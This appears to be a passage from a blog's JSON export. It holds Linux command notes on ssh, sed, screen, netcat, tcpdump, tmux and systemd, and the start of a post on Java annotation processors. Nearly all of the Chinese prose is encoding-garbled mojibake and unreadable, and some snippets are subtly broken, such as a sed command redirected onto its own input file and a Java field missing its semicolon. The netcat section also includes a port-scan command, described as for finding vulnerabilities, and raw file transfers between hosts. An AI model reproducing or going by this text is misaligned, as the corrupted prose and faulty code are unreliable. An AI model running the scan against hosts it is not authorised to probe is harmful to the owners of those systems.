authorizedFileä»€ä¹ˆçš„ã€‚ç»™è¿™ä¸ªserverèµ·ä¸ªåå­—ï¼Œæ¯”æ–¹å«åš: Remyå†æ¥æŠŠè¿™ä¸ªkeyæ·»åŠ  ssh-add -k id_rsa_xxx ï¼Œè¿™æ ·ä¸ç”¨æ¯æ¬¡éƒ½è¾“å…¥passphrase(ä¼šå‡ºæ¥ä¸€ä¸ªIdentity added: id_rsa_xxx)ã€‚æœ€å ssh Remy ï¼Œä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œå°±å¯ä»¥ç™»å½•æˆåŠŸäº† ç¼–ç çš„ä¿®æ”¹æ›´æ”¹localeä¸ºutf-8(ubuntu) vi ~/.bashrc # add these lines export LC_ALL=en_US.UTF-8 export LANG=en_US.UTF-8 export LANGUAGE=en_US.UTF-8 sudo locale-gen &quot;en_US.UTF-8&quot; sudo dpkg-reconfigure locales 12. sedå‘½ä»¤sed æ˜¯ä¸€ç§åœ¨çº¿ç¼–è¾‘å™¨ï¼Œå®ƒä¸€æ¬¡å¤„ç†ä¸€è¡Œå†…å®¹ã€‚å¤„ç†æ—¶ï¼ŒæŠŠå½“å‰å¤„ç†çš„è¡Œå­˜å‚¨åœ¨ä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œç§°ä¸ºâ€œæ¨¡å¼ç©ºé—´â€ï¼ˆpattern spaceï¼‰ï¼Œæ¥ç€ç”¨sedå‘½ä»¤å¤„ç†ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¤„ç†å®Œæˆåï¼ŒæŠŠç¼“å†²åŒºçš„å†…å®¹é€å¾€å±å¹•ã€‚æ¥ç€å¤„ç†ä¸‹ä¸€è¡Œï¼Œè¿™æ ·ä¸æ–­é‡å¤ï¼Œç›´åˆ°æ–‡ä»¶æœ«å°¾ã€‚æ–‡ä»¶å†…å®¹å¹¶æ²¡æœ‰ æ”¹å˜ï¼Œé™¤éä½ ä½¿ç”¨é‡å®šå‘å­˜å‚¨è¾“å‡ºã€‚æœ¬èº«æ˜¯ä¸ä¼šæ›´æ”¹æ–‡ä»¶å†…å®¹çš„ã€‚ ##æŠŠä¸€æ®µå­—ç¬¦ä¸²æ’å…¥æ–‡ä»¶çš„ç¬¬å››è¡Œå’Œç¬¬äº”è¡Œä¹‹é—´ï¼Œé»˜è®¤æ˜¯é€åˆ°äº†æ ‡å‡†è¾“å‡ºï¼ŒåŠ ä¸€ä¸ªé‡å®šå‘æ›´æ”¹äº†æ–‡ä»¶å†…å®¹ sed -e 4a\\/&quot;this will be append to the 5th line&quot; sample.txt &gt;&gt; sample.txt ## æ³¨æ„è¿™ä¸ªæ–œæ æ˜¯ä¸ºäº†è¯­æ³•é«˜äº®åŠ çš„ ## å°† /etc/passwd çš„å†…å®¹åˆ—å‡ºå¹¶ä¸”åˆ—å°è¡Œå·ï¼ŒåŒæ—¶ï¼Œè¯·å°†ç¬¬ 2~5 è¡Œåˆ é™¤ï¼ nl /etc/passwd | sed &#39;2,5d&#39; 14. å¤šä¸ªtty(TeleTypewriter)how-to-multitask-in-the-linux-terminal-3-ways-to-use-multiple-shells-at-once sudo apt-get install screenscreen ã€‚è¿›å…¥ä¸€ä¸ªæ–°çš„GNU screen // å¯ä»¥æ‰§è¡Œè€—æ—¶æŒ‡ä»¤æŒ‰ä½ctrl +a ï¼Œå†æŒ‰d ã€‚é€€å‡ºscreenscreen -r // é‡æ–°è¿›åˆšæ‰çš„screen 15. ipv6 howto## é¦–å…ˆåœ¨å¼€å¯ipv6çš„æœºå™¨ä¸Šç¡®è®¤æ˜¯å¦å¼€å¯äº†ipv6 ifconfig ## çœ‹ä¸‹æ˜¯å¦æœ‰ipv6 address netstat -tuln ## çœ‹ä¸‹å½“å‰è¿æ¥ä¸­æ˜¯å¦æœ‰ipv6 addr ifconfigçš„è¾“å‡ºå¤§è‡´å¦‚ä¸‹ï¼š inet6 addr: 2001:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx/64 Scope:Global inet6 addr: fe80::xxxx:xxxx:xxxx:xxxx/64 Scope:Link [Whatâ€™s that % sign after ipconfig IPv6 address?](https://howdoesinternetwork.com/2013/ipv6-zone-id) ## é‚£ä¸ª/64ä¸è¦ç®¡ï¼Œ2001.xxxç²˜è´´åˆ°[ipv6now](http://ipv6now.com.au/pingme.php) ## ç„¶åç”¨ä¸€äº›online ipv6 website pingä¸€ä¸‹ 16.netcat , cryptcatoracle pagenetcatæ˜¯ç½‘ç»œå·¥å…·ä¸­çš„ç‘å£«å†›åˆ€ï¼Œå®ƒèƒ½é€šè¿‡TCPå’ŒUDPåœ¨ç½‘ç»œä¸­è¯»å†™æ•°æ®ã€‚netcatæ‰€åšçš„å°±æ˜¯åœ¨ä¸¤å°ç”µè„‘ä¹‹é—´å»ºç«‹é“¾æ¥å¹¶è¿”å›ä¸¤ä¸ªæ•°æ®æµã€‚netcat = nc nc -z -v -n 172.31.100.7 21-100 ##ç”¨æ¥æ‰«æè¿™å°æœºå™¨ä¸Šå¼€æ”¾çš„ç«¯å£ï¼Œç”¨æ¥è¯†åˆ«æ¼æ´ z å‚æ•°å‘Šè¯‰netcatä½¿ç”¨0 IO,è¿æ¥æˆåŠŸåç«‹å³å…³é—­è¿æ¥ï¼Œ ä¸è¿›è¡Œæ•°æ®äº¤æ¢ v å‚æ•°æŒ‡ä½¿ç”¨å†—ä½™é€‰é¡¹ verbose n å‚æ•°å‘Šè¯‰netcat ä¸è¦ä½¿ç”¨DNSåå‘æŸ¥è¯¢IPåœ°å€çš„åŸŸå numeric u å‚æ•°ä½¿ç”¨udp ï¼Œé»˜è®¤æ˜¯tcp ## on the server side ï¼Œåˆ›å»ºä¸€ä¸ªchat æœåŠ¡å™¨ netcat -l -p 38929 ## l listen p port ï¼Œå¤§å†™çš„Lè¡¨ç¤ºsocketæ–­äº†ä¹‹åè‡ªåŠ¨é‡è¿ ## client nc 172.31.100.7 38929 ### now the server and client can talk to each other ## æ–‡ä»¶ä¼ è¾“ ### server nc -l 1567 &lt; file.txt ## client nc -n 172.31.100.7 1567 &gt; file.txt ### ä¼ è¾“ç›®å½• ### server tar -cvf â€“ dir_name | nc -l 1567 ### client nc -n 172.31.100.7 1567 | tar -xvf - Linux Netcat å‘½ä»¤â€”â€”ç½‘ç»œå·¥å…·ä¸­çš„ç‘å£«å†›åˆ€ 17. WireShark and netcapé¦–å…ˆæ˜¯wireSharkå’Œfiddleçš„å¯¹æ¯”Wireshark vs Firebug vs Fiddler - pros and cons? Wireshark, Firebug, Fiddler all do similar things - capture network traffic.Wireshark captures any kind of a network packet. It can capture packet details below TCP/IP(Http is at the top). It does have filters to reduce the noise it captures.Fiddler works as a http/https proxy. It captures each http request the computer makes and records everything associated with it. Does allow things like converting post varibles to a table form and editing/replaying requests. It doesnâ€™t, by default, capture localhost traffic in IE, see the FAQ for the workaround.The benefit of WireShark is that it could possibly show you errors in levels below the HTTP protocol. Fiddler will show you errors in the HTTP protocol. ç®€å•æ¥è¯´å°±æ˜¯fiddleåªæŠ“http(s)å±‚çš„packet,wireSharkæŠ“çš„æ˜¯tcp(udp)å±‚çš„ã€‚ wireShark &gt; fiddler(Charles ä¹Ÿå·®ä¸å¤šï¼ŒåªæŠ“httpå±‚çš„) åŸºæœ¬çš„æµç¨‹æ˜¯ï¼šé¦–å…ˆåœ¨linuxä¸Šç”Ÿæˆdump.pcapæ–‡ä»¶ï¼Œç„¶ååœ¨wireSharkä¸­æ‰“å¼€(å¯¹äº†è¦å…ˆå»wiresharkå®˜ç½‘ä¸‹windowsçš„å®‰è£…æ–‡ä»¶ï¼Œæ³¨æ„ä¸è¦è£…ä¸Šå…¨å®¶æ¡¶å°±æ˜¯äº†)ï¼› èŠèŠtcpdumpä¸WiresharkæŠ“åŒ…åˆ†æ sudo tcpdump -i &quot;venet0:0&quot; //tcpdumpéœ€è¦sudoæƒé™ sudo tcpdump -c 10 //count sudo tcpdump -c -A //Asiciiç å½¢å¼å±•ç¤ºå‡ºæ¥æ¯ä¸ªpackage sudo tcpdump -c 5 -i wlo1 // ç›‘å¬æŸä¸€ä¸ªç½‘å¡ sudo tcpdump -c 5 -i wlo1 port 22// ç›‘å¬æŸä¸€ä¸ªç½‘å¡æŸä¸€ä¸ªç«¯å£ sudo tcpdump -i eth0 -w dump.pcap -v //wè¡¨ç¤ºè¦ä¿å­˜çš„æ–‡ä»¶çš„ä½ç½® // æ³¨æ„è¿è¡Œä¸Šè¿°æŒ‡ä»¤çš„æ—¶å€™ï¼Œä¼šæ˜¾ç¤ºGot 18 è¿™ç§æç¤ºï¼Œæ„å‘³ç€å·²ç»æŠ“åˆ°äº†å¤šå°‘ä¸ªåŒ…ï¼Œè¿™ä¸ªæ•°å…¶å®ä¹Ÿæ˜¯éšç€æ—¶é—´æµé€ä¸€ç›´å¢é•¿çš„ã€‚ ctrl+cåœæ­¢æŠ“åŒ…ï¼Œä¼šç”Ÿæˆä¸€ä¸ªdump.pcapæ–‡ä»¶(ä¸è¦å°è¯•ç€å»cat æˆ–è€…lessï¼Œæ˜¯ä¸€ä¸ªbinary æ–‡ä»¶ï¼Œä¼šå´©çš„)ã€‚ tmuxå¼€ä¸¤ä¸ªçª—å£ï¼Œå°±æ˜¯åœ¨curlç™¾åº¦çš„æ—¶å€™æŠ“åŒ… tcpdump -nn -t host www.baidu.com curl -I www.baidu.com tcpdump version 4.5.1 libpcap version 1.5.3 Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ] [ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ] [ -i interface ] [ -j tstamptype ] [ -M secret ] [ -P in|out|inout ] [ -r file ] [ -s snaplen ] [ -T type ] [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z command ] [ -Z user ] [ expression ] 18.ubuntu desktopé¢„è®¾çš„desktop environmentå«åšunityæ¯”è¾ƒå¸¸è§çš„linux desktop è¿˜æœ‰gnome,KDE ,plasma,Ma tei, cinnamon. 19.tmuxä½¿ç”¨tmuxæ˜¯å¤šçª—å£ç¥å™¨ï¼Œå†ä¹Ÿä¸ç”¨å‚»ä¹ä¹çš„å»å¼€screenäº†ï¼Œè¿œç¨‹serverä¹Ÿèƒ½ç”¨ã€‚tmuxcheatsheettmuxåˆ›å»ºçš„çª—å£å«åšpaneï¼Œå…³é—­çš„æ–¹å¼æœ‰exitå’Œctrl+b xctrl+B // prefix,åŸºæœ¬ä¸Šå°±æ˜¯è®©tmuxå¼€å§‹æ¥æ”¶åé¢çš„æŒ‡ä»¤ctrl + b + â€œ //çºµå‘æ’åˆ—ctrl + b + % //æ¨ªå‘æ’åˆ—ctrl + b + z //zoomåˆ°è¿™ä¸ªpane,å†æŒ‰ä¸‹ctrl+b +z ä½¿å½“å‰paneé€€å‡ºå…¨å±ctrl + b + c //åˆ›å»ºä¸€ä¸ªæ–°çª—å£ctrl + b +p //previousçª—å£ nå°±æ˜¯nextçª—å£ctrl + b 2 //è·³åˆ°ç¬¬2ä¸ªçª—å£ctrl +b + &amp; å¹²æ‰å½“å‰çª—å£ctrl +b + , é‡å‘½åå½“å‰çª—å£ æ¥ä¸‹æ¥çœ‹å¦‚ä½•ä¿®æ”¹é…ç½®ä¿®æ”¹ ~/.tmux.conf æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ª æ¯æ¬¡éƒ½è¦æŒ‰ctrl+bå®åœ¨æ˜¯å¤ªéº»çƒ¦ï¼Œæ”¹æˆctrl+aå§ï¼Œå› ä¸ºaè·ç¦»ctrlè¿‘ä¸€ç‚¹ã€‚ä¸‹é¢ä¸‰è¡Œå°±æ”¹å¥½äº† set-option -g prefix C-aUNBIND-KEY C-abind key C a send prefix tmuxæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µ- session tmux list-sessions // åˆ—å‡ºå½“å‰æ‰€æœ‰sessionstmux ls // åˆ—å‡ºå½“å‰æ‰€æœ‰sessionsctrl+b + $ //å¯ä»¥é‡å‘½åsessionå¦‚æœä»ä¸€ä¸ªterminalä¸­å¼€äº†ä¸€ä¸ªtmux sessionï¼Œç„¶åç›´æ¥å³ä¸Šè§’å…³é—­terminalï¼Œåœ¨å…¶ä»–çš„terminalä¸­å°±èƒ½çœ‹åˆ°è¿™ä¸ªsessionä¸æ˜¯attachedçš„çŠ¶æ€å¦‚æœä¸æƒ³ç”¨ç‚¹å‡»å³ä¸Šè§’å‰å·çš„æ–¹å¼é€€å‡ºsessionï¼Œå¯ä»¥ä½¿ç”¨ctrl +B +d //disconnect from current session.è¿™æ ·å°±ä¸ç”¨å…³é—­æ•´ä¸ªterminaläº†tmux attach -t vim-dev //å‡è®¾vim-devæ˜¯ä¸€ä¸ªsessionçš„åå­—ä¸€ä¸ªå¥½ç©çš„ç°è±¡æ˜¯ï¼Œå¦‚æœå¼€ä¸¤ä¸ªterminalï¼Œè¿æ¥åˆ°åŒä¸€ä¸ªsessionï¼Œä»»ä½•åœ¨ä¸€ä¸ªsessionçš„æ“ä½œéƒ½ä¼šåœ¨å¦ä¸€ä¸ªsessionçš„terminalä¸­æ˜¾ç¤ºï¼Œå°±åƒè¿œç¨‹ååŠ©ä¸€æ ·ã€‚ctrl +b + ( //åˆ‡æ¢åˆ°å‰ä¸€ä¸ªsessionctrl +b + ) //åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªsession tmuxå¼€äº†ä¸Šä¸‹ä¸¤ä¸ªçª—å£ä¹‹åæ€ä¹ˆæ»‘åŠ¨ctrl + b + [ ï¼Œ ç„¶åé”®ç›˜ä¸Šä¸‹å°±å¯ä»¥æ»‘åŠ¨äº† , qæ˜¯é€€å‡º 20. ä½¿ç”¨systemdç®¡ç†ç¨‹åºSystemctlæ˜¯ä¸€ä¸ªsystemdå·¥å…·ï¼Œä¸»è¦è´Ÿè´£æ§åˆ¶systemdç³»ç»Ÿå’ŒæœåŠ¡ç®¡ç†å™¨ã€‚systemdä¸­ä¸€é¡¹æœåŠ¡ç§°ä¸ºunitLinuxå¼€æœºå¯åŠ¨ç®¡ç†â€”systemdä½¿ç”¨ sudo systemctl start application ## æ¯”æ–¹è¯´nginx sudo systemctl status nginx ## çœ‹ä¸‹çŠ¶æ€ sudo systemctl restart application.service sudo systemctl reload application.service sudo systemctl reload-or-restart application.service sudo systemctl enable application.service ##å¼€æœºå¯åŠ¨ ## å¼€æœºå¯åŠ¨çš„åŸç†æ˜¯å¾€/lib/systemd/systemæˆ–è€…/etc/systemd/systemè¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºäº†ç±»ä¼¼äºnginx.serviceçš„symbolic linkã€‚ ## æŒ‡å‘åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºçš„xxx.target.wantsæ–‡ä»¶ **è®°å¾—ä¿®æ”¹äº†.serviceæ–‡ä»¶è¦reloadä¸€ä¸‹systemd** &gt;# é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ $ sudo systemctl daemon-reload # é‡å¯ç›¸å…³æœåŠ¡ $ sudo systemctl restart foobar sudo systemctl disable application.service ## ç¦æ­¢å¼€æœºå¯åŠ¨ ## è¿™å¥è¯å°±æ˜¯å–æ¶ˆäº†symbolic link sudo systemctl is-active nginx.service ## çœ‹ä¸‹åœ¨ä¸åœ¨è·‘ active systemctl is-enabled application.service systemctl is-failed application.service systemctl list-units --all ## æ‰€æœ‰systemdåŠ è½½ï¼ˆæˆ–è€…å°è¯•è¿‡åŠ è½½ï¼‰çš„ç¨‹åº systemctl list-units --all --state=inactive ## åªçœ‹activeçš„ systemctl list-unit-files ## å’Œlist-unitsä¸ä¸€æ ·ï¼Œè¿™é‡Œè¿˜åŒ…æ‹¬äº†systemdä¸ºå°è¯•è¿‡parseçš„é…ç½® sudo systemctl halt ## æŒ‚èµ· sudo systemctl poweroff ## å…³æœº sudo systemctl reboot ## é‡å¯ å…¶å®sudo rebootä¹Ÿæ˜¯æŒ‡å‘/bin/systemctlçš„è½¯é“¾æ¥ systemctl cat sshd.service ## æŸ¥çœ‹ä¸€ä¸ªæœåŠ¡çš„é…ç½®æ–‡ä»¶ ç³»ç»ŸåŸºæœ¬serviceæœåŠ¡é…ç½®ç›®å½•ï¼ˆæ­¤ç›®å½•å‹¿åŠ¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªæ”¾ç³»ç»Ÿæ ¸å¿ƒåŸºç¡€æœåŠ¡é…ç½®ï¼Œå¦å­˜æ”¾åº”ç”¨æ³¨å†Œç±»æœåŠ¡é…ç½®ï¼‰ï¼š/etc/systemd/systemï¼Œè‡ªå®šä¹‰æœåŠ¡é…ç½®ç®¡ç†ç›®å½•ï¼ˆå­˜æ”¾è‡ªå®šä¹‰åº”ç”¨æ³¨å†Œç±»æœåŠ¡å’Œç¬¬ä¸‰æ–¹æœåŠ¡ç±»é…ç½®ï¼‰ï¼š/usr/lib/systemd/system/ è‡ªå®šä¹‰.serviceé…ç½®æ–‡ä»¶ï¼Œå®ç°å¼€æœºè‡ªå¯(å¼€æœºæ‰§è¡Œä¸€ä¸ªshè„šæœ¬)çš„æ­¥éª¤ åˆ›å»ºä¸€ä¸ªstart-script.serviceæ–‡ä»¶(æƒé™æ”¹æˆ754),å¤§è‡´å†…å®¹å¦‚ä¸‹ [Unit]Description=â€app-run@Author Jack Liu Process Daemonâ€ # æœåŠ¡æè¿°After=rc-local.service # æœåŠ¡ç±»åˆ«ï¼š # ä¾‹å¯åŠ¨é¡ºåº(é»˜è®¤åœ¨rc-local.serviceä¹‹åè°ƒç”¨æ‰§è¡Œ) [Service]Type=forking # ä¼˜å…ˆä½¿ç”¨forkingæ–¹å¼: # (éµå¾ªä¼ ç»ŸUnixåšæ³•,è®¾ç½®PIDFile=é€‰é¡¹ # å¸®åŠ©systemdå‡†ç¡®å®šä½è¯¥æœåŠ¡çš„ä¸»è¿›ç¨‹) PIDFile=/var/run/app-run.pid # è®¾ç½®åº”ç”¨è¿›ç¨‹çš„PIDï¼ˆç¼ºçœï¼‰Environment=â€GOPATH=/usr/local/goâ€ # ç¯å¢ƒå˜é‡è®¾ç½®ï¼Œå¯è®¾ç½®å¤šä¸ªEnvironment=é¡¹ # å¤‡æ³¨ï¼šEnvironment= æˆ– EnvironmentFile= # å¼•ç”¨æ–‡ä»¶, ä¸¤ç§æ–¹å¼çš†å¯ ExecStart=/data/auto_run.sh start # è°ƒç”¨å¯åŠ¨å¯æ‰§è¡Œæ–‡ä»¶ï¼š è¿™å°±æ˜¯è¦æ‰§è¡Œçš„shè„šæœ¬ # ï¼ˆServiceé…ç½®å…¨éƒ¨ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œ # å¯æ‰§è¡Œæ–‡ä»¶å†…å‘½ä»¤ç”¨ç»å¯¹çš„è·¯å¾„æ ¼å¼ï¼‰ ExecReload=/data/auto_run.sh reload # é‡æ–°åŠ è½½ï¼ˆç¼ºçœï¼‰ExecStop=/data/auto_run.sh stop # åœæ­¢æœåŠ¡ï¼ˆç¼ºçœï¼‰DefaultTimeoutStartSec=30 # æœåŠ¡å¯åŠ¨å…è®¸çš„æœ€å¤§æ—¶é•¿ï¼Œè¶…æ—¶æ—¶é—´ï¼ˆé»˜è®¤æ— å•ä½:ç§’ï¼‰ # å•ä½ï¼š&quot;ms&quot;(æ¯«ç§’), &quot;s&quot;(ç§’), &quot;min&quot;(åˆ†é’Ÿ), # &quot;h&quot;(å°æ—¶), &quot;d&quot;(å¤©), &quot;w&quot;(å‘¨) PrivateTmp=True # æ˜¯å¦åˆ†é…ç‹¬ç«‹çš„ä¸´æ—¶ç©ºé—´ï¼ˆç¼ºçœï¼‰[Install]WantedBy=multi-user.target æŠŠè¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°/usr/lib/systemd/useræ–‡ä»¶å¤¹ä¸­ åœ¨/data/auto_run.shè¿™ä¸ªè„šæœ¬ä¸­å†™è‡ªå·±çš„ä¸šåŠ¡é€»è¾‘,æ¯”å¦‚è¯´ #!/bin/bashdate &gt;&gt; /tmp/date æŠŠè¿™ä¸ªserviceæ³¨å†Œåˆ°ç³»ç»Ÿä¸­systemctl enable start-script.service æå®š,å¦‚æœserviceæ–‡ä»¶ä¸ä¼šå†™çš„è¯ï¼Œçœ‹ä¸‹/lib/systemd/system/nginx.serviceå°±å¥½äº† systemctlå¸¦æ¥çš„ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨journalctlå‘½ä»¤æŸ¥çœ‹æ‰€æœ‰Unitçš„å¯åŠ¨æ—¥å¿—(å†…æ ¸æ—¥å¿—å’Œåº”ç”¨æ—¥å¿—)ã€‚æ—¥å¿—çš„é…ç½®æ–‡ä»¶æ˜¯/etc/systemd/journald.conf ## æŸ¥çœ‹æ‰€æœ‰æ—¥å¿—ï¼ˆé»˜è®¤æƒ…å†µä¸‹ ï¼Œåªä¿å­˜æœ¬æ¬¡å¯åŠ¨çš„æ—¥å¿—ï¼‰ $ sudo journalctl # æŸ¥çœ‹ç³»ç»Ÿæœ¬æ¬¡å¯åŠ¨çš„æ—¥å¿— $ sudo journalctl -b $ sudo journalctl -n 20 //æŸ¥çœ‹20è¡Œ $ sudo journalctl --since yesterday sudo journalctl -u yourservice //ä¸å¸¦åé¢çš„.service ## è¿˜æœ‰å¾ˆå¤šï¼Œèƒ½å¤ŸçŸ¥é“ç³»ç»Ÿå¯åŠ¨æ—¶å‘ç”Ÿäº†ä»€ä¹ˆ sudo journalctl --disk-usage //çœ‹ä¸‹å½“å‰journalctlå ç”¨äº†å¤šå°‘ç£ç›˜å®¹é‡ journalctl --vacuum-time=2d //åªä¿ç•™è¿‡å»ä¸¤å¤©çš„æ—¥å¿— journalctl --vacuum-size=500M //åªä¿ç•™æœ€å¤š500MBçš„æ—¥å¿— https://unix.stackexchange.com/questions/139513/how-to-clear-journalctl systemdå‡ºé”™äº†debugç®€ç›´è¦å‘½ï¼Œä¸€ç§æ–¹å¼æ˜¯ï¼Œless +F /var/log/syslog åªæ˜¯æƒ³è¦é€šè¿‡systemdå»å¯åŠ¨ä¸€ä¸ªå¼€æœºè„šæœ¬çš„è¯ [Unit] Description=run shell script [Service] Type=oneshot ExecStart=/usr/bin/yourscript [Install] WantedBy=multi-user.target ç„¶åå¯ä»¥çœ‹ä¸€ä¸‹ä½ è¿™ä¸ªtaskçš„çŠ¶æ€ sudo systemctl status ä¸Šé¢è¿™ä¸ªæ–‡ä»¶çš„åå­—.servicesudo systemctl start ä¸Šé¢è¿™ä¸ªæ–‡ä»¶çš„åå­—.service ## æ‰‹åŠ¨å»å¯åŠ¨ä¹Ÿæ˜¯å¯ä»¥çš„ fdisk -l ## show a list of hard drives that are attached to your computer, fdiskå°±æ˜¯ç¡¬ç›˜åˆ†åŒºå‘½ä»¤ 21. å…³äºå‘½ä»¤è¡Œä¸­æ ‡ç‚¹ç¬¦å·çš„ä½¿ç”¨åœ¨unixç³»ç»Ÿä¸Šå‚æ•°çš„åˆ†éš”ç¬¦æ˜¯â€ : â€œåœ¨windowsç³»ç»Ÿä¸Šåˆ†å‰²ç¬¦æ˜¯â€ ; â€œè¿˜æœ‰å°±æ˜¯forward slashå’Œback slashäº† nl (ç±»ä¼¼äºcatï¼Œåªæ˜¯å±•ç¤ºæ–‡æœ¬çš„æ—¶å€™å¸¦ä¸Šè¡Œå·),fold(é™å®šæ¯ä¸€è¡Œæœ€å¤šå¤šå°‘ä¸ªå­—ç¬¦ï¼Œè¶…è¿‡äº†è‡ªåŠ¨æ¢è¡Œ) curl ipinfo.io/ip ç”¨äºè·å–æœ¬æœºå¤–éƒ¨ipåœ°å€ å‚è€ƒ å·¥å…·å‚è€ƒ æ–‡ä»¶å¤§å°æŸ¥çœ‹å‘½ä»¤ æ–‡ä»¶å‹ç¼©å‘½ä»¤ ç¡¬ä»¶æŸ¥è¯¢ Pythonæºç ç¼–è¯‘å®‰è£…ss æºç ç¼–è¯‘å®‰è£…ss ä¿®æ”¹ç³»ç»Ÿç¼–ç ä¸ºutf-8 Linuxå·¥å…·å¿«é€Ÿæ•™ç¨‹","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"ä½¿ç”¨AnnotationProcessorè‡ªåŠ¨ç”Ÿæˆä»£ç ","date":"2016-12-31T22:42:15.000Z","path":"2016/12/31/2016-12-31-Eliminating-BoilPlate-AnnotationProcessor/","text":"è®°å¾—Romain Guyåœ¨ä¸€æ¬¡DroidConä¸Šæ›¾è¯´è¿‡: As I understand, modern java development are all about wrting annaotation Processors and not wrting code anymoreâ€¦ å…¨åœºè§‚ä¼—å¤§ç¬‘ã€‚ã€‚ã€‚ è¿™ä¹‹åç»å¸¸çœ‹åˆ°Jack Whartonåœ¨æ¼”è®²ä¸­æåˆ°â€My Hypothetical Annotation Processorâ€¦â€ ï¼Œåæ¥æ‰æ„è¯†åˆ°åƒRetrofitï¼ŒButterKnifeè¿™äº›éƒ½æ˜¯ä½¿ç”¨äº†æ³¨è§£çš„æ–¹å¼ã€‚ 1. åŸç†ä»‹ç»Annotation Processoring Toolæ˜¯javacçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä¼šåœ¨ç¼–è¯‘æœŸç”Ÿæˆæ–°çš„.javaæ–‡ä»¶ï¼ˆä¸æ˜¯classæ–‡ä»¶ï¼‰å®šä¹‰ä¸€ä¸ªAnnotationçš„è¯­æ³•å¦‚ä¸‹ï¼š @Documented @Target(ElementType.TYPE) //è¿™è¯´æ˜ç”Ÿæˆçš„æ³¨è§£èƒ½å¤Ÿæ”¾åœ¨class,interface,enumç­‰ç±»å‹ä¸Šã€‚ä¸èƒ½æ”¾åœ¨methodä¸Š @Retention(RetentionPolicy.SOURCE) //æŒ‡æ˜åœ¨ç¼–è¯‘å™¨æœ‰æ•ˆ public @interface Builder { //@interfaceå°±åƒclass,interface,enumä¸€æ · } 2.Annotation Processoræ˜¯ç”Ÿæˆæ–°ä»£ç çš„å®ç°ç±»å¤§è‡´çš„å®ç°ä¾‹å¦‚ï¼š public class PojoStringProcessor extends AbstractProcessor { private static final String ANNOTATION = &quot;@&quot; + PojoString.class.getSimpleName(); private static final String CLASS_NAME = &quot;StringUtil&quot;; private Messager messager; //æœ‰ç‚¹åƒLogger,ç”¨äºè¾“å‡ºä¿¡æ¯ private Filer filer //å¯ä»¥è·å¾—Build Pathï¼Œç”¨äºç”Ÿæˆæ–‡ä»¶ //publicæ„é€ å‡½æ•°ä¸å†™ä¹Ÿä¼šè‡ªåŠ¨åŠ ä¸Š // initåšä¸€äº›åˆå§‹åŒ–æ“ä½œ @Override public synchronized void init(ProcessingEnvironment processingEnv) { super.init(processingEnv); messager = processingEnv.getMessager(); this.filer = processingEnv.getFiler(); } //aptåœ¨æ£€æŸ¥è¢«æ³¨è§£çš„classæ—¶ï¼Œä¼šè¿”å›ä½ éœ€è¦çš„æ³¨è§£ç±»å‹ @Override public Set&lt;String&gt; getSupportedAnnotationTypes() { return immutableSet.of(Builder.class.getCanonicalName()); } //java7,java8 æœ‰ç‚¹åƒandroidçš„targetSdk Version @Override public SourceVersion getSupportedSourceVersion() { return SourceVersion.latestSupported(); } //é‡ç‚¹ @Override public boolean process(Set&lt;? extends TypeElement&gt; annotations, RoundEnvironment roundEnv) { ArrayList&lt;AnnotatedClass&gt; annotatedClasses = new ArrayList&lt;&gt;(); for (Element element : roundEnv.getElementsAnnotatedWith(PojoString.class)) { TypeElement typeElement = (TypeElement) element; if (!isValidClass(typeElement)) { return true; //aptæ‰¾åˆ°çš„æ‰€æœ‰è¢«æ³¨è§£çš„class } try { annotatedClasses.add(buildAnnotatedClass(typeElement)); } catch (IOException e) { String message = String.format(&quot;Couldn&#39;t process class %s: %s&quot;, typeElement, e.getMessage()); messager.printMessage(Diagnostic.Kind.ERROR, message, element); e.printStackTrace(); } } try { generate(annotatedClasses); } catch (IOException e) { messager.printMessage(Diagnostic.Kind.ERROR, &quot;Couldn&#39;t generate class&quot;); } return true; } } å‡ ä¸ªé‡è¦çš„æ–¹æ³•è§£é‡Šä¸‹ï¼š roundEnv: aptåˆ†ä¸¤æ­¥ï¼š1. aptå‘ç°è¢«æ³¨è§£çš„ä»£ç ï¼Œæä¾›ç»™æˆ‘ä»¬å†™çš„processorï¼Œåè€…ç”Ÿæˆæ–°çš„javaä»£ç (aptè¿˜æœªå¤„ç†è¿™éƒ¨åˆ†æ–°ä»£ç )ã€‚ aptå‘ç°æ–°ä»£ç ï¼Œæä¾›ç»™æˆ‘ä»¬çš„Processorï¼Œä¸ç”Ÿæˆæ–°ä»£ç ã€‚å®Œæˆprocessingã€‚ï¼ˆåé¢æä¾›ç»™ç¼–è¯‘ï¼‰ ServiceLoader Discovery Fileï¼ˆè¿™è´§åœ¨jarä¸­ï¼‰//META-INFO/services/javax.annotations.processing.Processoræ–‡ä»¶ä¸­å†™å…¥com.example.annotation.BuilderProcessor// classåŒ…å//è¿™é‡Œå£°æ˜æ‰€æœ‰çš„processorï¼Œè¿™é‡Œå¯ä»¥includeåˆ«çš„processor è¯­æ³•ï¼š app/build.gradle dependencies { compile project(&#39;: annotation&#39;) apt project (&#39;:processor&#39;) } //apt è¡¨ç¤ºprocessorä¸­çš„æ–¹æ³•ä¸ä¼šå¸¦åˆ°distributed apkä¸­,æ–¹æ³•æ•°ä¸ç”¨æ‹…å¿ƒäº† //https://bitbucket.org/hvisser/android-apt //https://github.com/tbroyer/gradle-apt-plugin 